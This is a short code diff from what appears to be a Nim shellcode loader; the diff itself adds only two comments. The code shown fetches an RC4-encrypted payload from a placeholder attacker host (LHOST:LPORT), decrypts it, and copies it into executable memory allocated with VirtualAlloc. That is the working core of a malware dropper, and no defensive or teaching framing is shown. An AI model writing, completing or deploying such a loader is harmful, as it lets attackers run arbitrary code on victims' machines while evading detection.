@@ -15,11 +15,12 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
 
 proc main(): void = 
+    # Get data and decode from RC4
     data = client.getContent("http://LHOST:LPORT/SHELLCODE")
     client.close()
     dec = fromRC4(key, data)
     shellcode = toByteSeq(dec)
-    
+    # Load in memory
     var shellcode_len = cast[SIZE_T](len(shellcode))
     var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     CopyMemory(buffer, &shellcode[0], shellcode_len);
